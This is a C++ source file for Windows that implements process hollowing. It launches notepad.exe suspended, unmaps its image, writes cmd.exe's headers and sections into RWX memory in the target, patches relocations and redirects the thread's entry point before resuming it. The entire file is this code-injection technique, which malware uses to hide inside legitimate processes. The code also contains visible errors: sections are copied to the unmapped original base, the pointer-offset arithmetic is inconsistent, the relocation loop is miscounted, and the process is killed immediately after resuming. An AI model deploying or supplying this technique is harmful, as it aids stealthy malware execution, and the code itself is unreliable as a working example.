#include <Windows.h>
#include <Tlhelp32.h>
#include <stdio.h>
#include <winternl.h>

#define CountRelocationBlocks(dwBlockSize)(dwBlockSize - sizeof(BASE_RELOCATION_BLOCK))/sizeof(BASE_RELOCATION_ENTRY);

typedef NTSTATUS(WINAPI* ptNtUnmapViewOfSection)(HANDLE handle, PVOID pvoid);
ptNtUnmapViewOfSection NtUnmapViewOfSection = NULL;
typedef NTSTATUS(NTAPI* ptNtQueryInformationProcess)(HANDLE hProcess, UINT ProcInfoClass, PVOID ProcInfo, ULONG ProcInfoLenght, PULONG returnLenght);
ptNtQueryInformationProcess NtQueryInfoProcess = NULL;
typedef struct BASE_RELOCAITON_BLOCK {
	DWORD BlockAddress;
	DWORD BlockSize;
} BASE_RELOCATION_BLOCK, *PBASE_RELOCATION_BLOCK;
typedef struct BASE_RELOCATION_ENTRY {
	USHORT offset : 12;
	USHORT Type : 4;
} BASE_RELOCATION_ENTRY, * PBASE_RELOCATION_ENTRY;


int main(void) {
	HANDLE hprocHandle;
	LPPROCESS_INFORMATION pprocinfo = new PROCESS_INFORMATION();
	LPSTARTUPINFOA pstartupinfo = new STARTUPINFOA();
	PPROCESS_BASIC_INFORMATION procBasicInfo = new PROCESS_BASIC_INFORMATION();

	CreateProcessA(NULL, (LPSTR)"C:\\Windows\\System32\\notepad.exe", NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, pstartupinfo, pprocinfo);

	if (!pprocinfo->hProcess) {
		printf("Failed to create process;");
		return 1;
	}

	HMODULE hmod = LoadLibraryW(L"ntdll.dll");
	if (hmod) {
		NtQueryInfoProcess = (ptNtQueryInformationProcess)GetProcAddress(hmod, "NtQueryInformationProcess");
	}

	// get notepad.exe imgbaseaddress
	ULONG retlen;
	hprocHandle = pprocinfo->hProcess;
	NtQueryInfoProcess(hprocHandle, ProcessBasicInformation, procBasicInfo, sizeof(PROCESS_BASIC_INFORMATION), &retlen);
	LPVOID pebAddress = procBasicInfo->PebBaseAddress;
	PDWORD pebImageBaseAddress = (PDWORD)pebAddress + 4;
	LPVOID imgBaseAddress = NULL;
	ReadProcessMemory(hprocHandle,(LPCVOID)pebImageBaseAddress, &imgBaseAddress, 6, NULL);
	
	// get cmd.exe imgbaseaddress
	HANDLE sourcefileHandle = CreateFileA("C:\\Windows\\System32\\cmd.exe", GENERIC_READ, NULL, NULL, OPEN_ALWAYS, NULL, NULL);
	DWORD sourcefileSize = GetFileSize(sourcefileHandle, NULL);
	DWORD sourcefileRead = NULL;
	LPVOID sourcefileBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sourcefileSize);
	ReadFile(sourcefileHandle, sourcefileBuffer, sourcefileSize, &sourcefileRead, NULL);

	// retrieving source file info (Dos and NT headers)
	PIMAGE_DOS_HEADER sourcefileDosHeader = (PIMAGE_DOS_HEADER)sourcefileBuffer;
	PIMAGE_NT_HEADERS sourcefileNTHeader = (PIMAGE_NT_HEADERS)((LPDWORD)sourcefileBuffer + sourcefileDosHeader->e_lfanew / 4);
	DWORD sourceImgSize = sourcefileNTHeader->OptionalHeader.SizeOfImage;

	// unmapping destination image section
	NtUnmapViewOfSection = (ptNtUnmapViewOfSection)GetProcAddress(LoadLibraryA("ntdll"), "NtUnmapViewOfSection");
	NtUnmapViewOfSection(hprocHandle, imgBaseAddress);

	// Allocating new page in destination
	LPVOID procMemoryAddress = VirtualAllocEx(hprocHandle, NULL, sourceImgSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	
	LPVOID newImgBase = procMemoryAddress;
	DWORD deltaImgBase = (PDWORD)newImgBase - (PDWORD)imgBaseAddress;

	// writing image header to new destination image base
	sourcefileNTHeader->OptionalHeader.ImageBase = (DWORD)newImgBase;
	WriteProcessMemory(hprocHandle, newImgBase, sourcefileBuffer, sourcefileNTHeader->OptionalHeader.SizeOfImage, NULL);

	// retrieving section info from source file
	PIMAGE_SECTION_HEADER sourcefileSectionHeader = (PIMAGE_SECTION_HEADER)((LPDWORD)sourcefileBuffer + sourcefileDosHeader->e_lfanew/4 + sizeof(IMAGE_NT_HEADERS)/4);
	PIMAGE_SECTION_HEADER saved_sourcefileSectionHeader = sourcefileSectionHeader;

	// copying source file sections to destination
	for (int i = 0; i < sourcefileNTHeader->FileHeader.NumberOfSections; i++) {
		LPVOID destinationSection = (LPDWORD)imgBaseAddress + sourcefileSectionHeader->VirtualAddress / 4;
		LPVOID sourcefileSection = (LPDWORD)sourcefileBuffer + sourcefileSectionHeader->PointerToRawData / 4;
		WriteProcessMemory(hprocHandle, destinationSection, sourcefileSection, sourcefileSectionHeader->SizeOfRawData, NULL);
		sourcefileSectionHeader++;
  	}

	// Relocation
	IMAGE_DATA_DIRECTORY relocTable = (IMAGE_DATA_DIRECTORY)sourcefileNTHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
	sourcefileSectionHeader = saved_sourcefileSectionHeader;

	for (int i = 0; i < sourcefileNTHeader->FileHeader.NumberOfSections; i++) {
		const char* relocstr = ".reloc";
		if (memcmp(relocstr, sourcefileSectionHeader->Name, 6) != 0) {
			sourcefileSectionHeader++;
			continue;
		}

		DWORD sourceRelocTableRaw = sourcefileSectionHeader->PointerToRawData;
		DWORD relocOffset = 0;

		while (relocOffset < relocTable.Size) {
			PBASE_RELOCATION_BLOCK pBlockheader = (PBASE_RELOCATION_BLOCK)((LPDWORD)sourcefileBuffer + sourceRelocTableRaw/4 + relocOffset/4);
			relocOffset += sizeof(BASE_RELOCATION_BLOCK);
			DWORD relocationCount = (pBlockheader->BlockSize - sizeof(BASE_RELOCAITON_BLOCK)) / sizeof(BASE_RELOCATION_ENTRY);
			PBASE_RELOCATION_ENTRY relocationEntries = (PBASE_RELOCATION_ENTRY)((LPDWORD)sourcefileBuffer + sourceRelocTableRaw/4 + relocOffset/4);
			PBASE_RELOCATION_ENTRY savedrelocationEntries = relocationEntries;

			printf("reloctable size: %d\n", relocTable.Size);

			for (int c = 0; c < relocationCount; c++) {;
				DWORD patchBuffer = 0;
				DWORD patchAddress = relocationEntries[c].offset;

				if (relocationEntries[c].offset == 0) {
					continue;
				}
				relocOffset += sizeof(BASE_RELOCATION_ENTRY);
				ReadProcessMemory(hprocHandle, (LPCVOID)((LPDWORD)newImgBase + patchAddress/4), &patchBuffer, sizeof(DWORD), NULL);
				patchBuffer += deltaImgBase;
				WriteProcessMemory(hprocHandle, ((LPDWORD)newImgBase + patchAddress / 4), &patchBuffer, sizeof(DWORD), NULL);
			}
			printf("relocoffset: %d\n", sizeof(relocOffset));
			
		}
	}
	
	LPCONTEXT context = new CONTEXT();
	context->ContextFlags = CONTEXT_INTEGER;
	SuspendThread(pprocinfo->hThread);
	GetThreadContext(pprocinfo->hThread, context);

	LPVOID patchedEntryPoint = LPVOID((LPDWORD)newImgBase + sourcefileNTHeader->OptionalHeader.AddressOfEntryPoint / 4);

	context->Rax = (DWORD64)patchedEntryPoint;
	SetThreadContext(pprocinfo->hThread, context);
	ResumeThread(pprocinfo->hThread);

	HeapFree(GetProcessHeap(), sourcefileSize, sourcefileBuffer);
	TerminateProcess(hprocHandle, 1);
	CloseHandle(sourcefileHandle);
	CloseHandle(hprocHandle);

	return 0;
}